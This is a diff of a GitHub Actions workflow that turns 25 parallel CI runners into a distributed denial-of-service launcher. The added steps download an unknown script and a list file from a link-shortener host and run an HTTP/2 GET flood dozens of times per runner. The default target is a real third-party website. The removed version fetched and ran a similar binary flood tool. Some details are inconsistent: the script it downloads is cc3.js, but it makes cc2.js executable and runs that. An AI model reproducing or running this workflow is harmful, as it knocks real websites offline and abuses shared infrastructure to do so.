@@ -1,12 +1,19 @@
-name: Tornado !
-
+name: era7
 on:
   workflow_dispatch:
     inputs:
       target:
-        description: "Site !"
+        description: "URL"
         required: true
-        default: "http://127.0.0.1/"
+        default: "https://www.r10.net/"
+      time:
+        description: "Time)"
+        required: true
+        default: "115"
+      rate:
+        description: "Rate"
+        required: true
+        default: "100"
 
 jobs:
   vds:
@@ -14,29 +21,33 @@ jobs:
     strategy:
       max-parallel: 25
       matrix:
-        instance: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25]
-
+        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25]
+    
     steps:
-      - name: Checkout (optional)
-        uses: actions/checkout@v4
-
-      - name: OK !
-        run: |
-          TARGET="${{ inputs.target }}"
-          wget https://curl.by/mxwYo/blaze
-          chmod +x blaze
-          
-          PIDS=()
-          for i in {1..8}; do
-            sudo timeout 260 ./blaze "$TARGET" 250 10 10 GET
-            PIDS+=($!)
-          done
-
-          for pid in "${PIDS[@]}"; do
-            wait $pid
-          done
-
-      - name: Finish !
-        run: |
-          sleep 30
-          exit 0
+    - name: Dosyaları indir ve hazırla
+      run: |
+        wget https://curl.by/cnsxx/cc3.js
+        wget https://curl.by/q9W_R/gon.txt
+        chmod +x cc2.js
+        npm i hpack https commander colors 
+    - name: run
+      run: |
+        TARGET="${{ inputs.target }}"
+        TIME="${{ inputs.time }}"
+        RATE="${{ inputs.rate }}"
+        
+        PIDS=()
+        for i in {1..96}; do
+          sudo timeout $TIME node cc2.js GET "$TARGET" 200 10 "$RATE" gon.txt --full  --http 2 --winter
+          PIDS+=($!)
+        done
+        
+        for pid in "${PIDS[@]}"; do
+          wait $pid
+        done
+    
+    - name: Bekleme
+      run: sleep ${{ inputs.time }}
+    
+    - name: Sistemi yeniden başlat
+      run: sudo reboot
